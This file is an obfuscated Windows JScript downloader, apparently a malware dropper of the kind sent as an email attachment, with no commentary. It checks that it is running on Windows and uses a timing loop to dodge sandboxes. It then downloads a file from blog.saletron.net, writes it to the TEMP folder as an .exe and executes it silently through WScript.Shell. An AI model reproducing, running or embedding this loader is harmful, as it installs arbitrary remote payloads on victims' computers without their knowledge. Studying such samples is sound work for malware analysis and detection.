var N = false;
var Cw = "CreateObject";
var WO = function Ku() {return WScript[Cw]("WScript.Shell");}(), I = 11;
var d0 = "MSXML2.XMLHTTP";
var e0 = 2123213;
var ym = 0;
function Ip(wl){WO["Run"](wl, ym, ym);};
function MN(){return "" + d0;};
function CG(f0, H){ym = ym * 1; return f0 - H;};
function DZ(){return Cw;};
/*@cc_on
  @if (@_win32 || @_win64)
    N = true;
  @end
@*/
if (N)
{
var ft = "";
function L(){return 22;};
var Kn = 0; var kW = 0;
function d()
{
var m = new this["Date"]();
var f = m["getUTCMilliseconds"]();
WScript["Sleep"](L());
var m = new this["Date"]();
var iT = m["getUTCMilliseconds"]();
WScript["Sleep"](L());
var m = new this["Date"]();
var J = m["getUTCMilliseconds"]();
var Kn = "rO";
Kn = CG(iT, f);
var kW = "QZ";
kW = CG(J, iT);
ft = "open";
return CG(Kn, kW);
}
var fr = false;
var x = false;
for (var g = ym; g < L() * 1; g++){if (d() != ym){
fr = true; 
kW = "31" + 11 * Kn + kW; 
x = true; 
break;
}}
function Y() {return ((fr == true) && (fr == x)) ? 1 : ym;};
if (fr && Y() && x){
function Yh() {return WO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9MSyx6z9y6c8.exe";};
 cf = MN();
 b = WScript[Cw](cf);
 var e = 1;
 while (e){
try {
b[ft]("GET", "http://blog.saletron.net/li9soz", false);
b["send"]();
t = "Sleep";
for (;;){WScript[t](L() * 11); if (b["readystate"] >= 2 * 2) break;};
e = ym;
} catch(d1){};
}
function Wl(P) {var Qo = (1, 2, 3, 4, 5, P); return Qo;};
R = WScript[DZ()]("ADODB.Stream");
cf = R;
cf[ft]();
cf["type"] = Wl(1);
cf["write"](b["ResponseBody"]);
R["position"] = Wl(ym);
cf["Save" + "ToFile"](Yh(), 2);
R["c"+"lose"]();
Un = Yh();
Ip(Un);
}
}

